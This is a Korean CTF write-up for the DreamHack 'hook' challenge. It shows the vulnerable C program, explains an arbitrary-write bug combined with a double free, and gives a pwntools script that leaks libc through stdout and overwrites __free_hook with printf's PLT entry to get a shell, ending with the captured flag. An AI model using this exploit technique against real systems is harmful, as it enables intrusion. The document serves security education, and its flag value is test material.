# [DreamHack] hook

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 작동하고 있는 서비스(hook)의 바이너리와 소스코드가 주어집니다.
> 프로그램의 취약점을 찾고 _hook Overwrite 공격 기법으로 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [hook.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8548668/hook.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160263060-be36378f-36b3-4f57-9594-2338dc31af90.png)

## Analysis

```c
int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);
   
    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

마지막의 `system("/bin/sh")`을 실행시키는 것이 목표이다. 즉 그 전에 오류가 나서 프로세스가 중단되지 않도록 해야 한다.

원하는 크기만큼 `malloc()`으로 메모리를 할당받아서 데이터를 입력할 수 있다. 입력한 데이터의 첫 8바이트는 주소, 그 다음 8바이트는 값이다.

`free(ptr)`을 두 번 실행하면 double free bug가 발생하면서 오류가 난다. free hook을 덮어서 프로세스 진행에 영향이 가지 않는 다른 함수가 실행되도록 하면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/hook')
    stdout_offset = 0x3ec760
    freehook_offset = 0x3ed8e8
else:
    r = remote('host1.dreamhack.games', 13070)
    stdout_offset = 0x3c5620
    freehook_offset = 0x3c67a8

printf_plt = 0x400790  # PLT of printf()


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
freehook = libc + freehook_offset  # __free_hook


# overwrite free hook with PLT of printf()

r.sendlineafter('Size: ', '16')
r.sendafter('Data: ', p64(freehook) + p64(printf_plt))


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 13070: Done
[*] Switching to interactive mode
\xa87Nk\x1b\x7f\xa87Nk\x1b\x7f$ cat flag
DH{5203c83c34143bab58f653d1c1339016}
```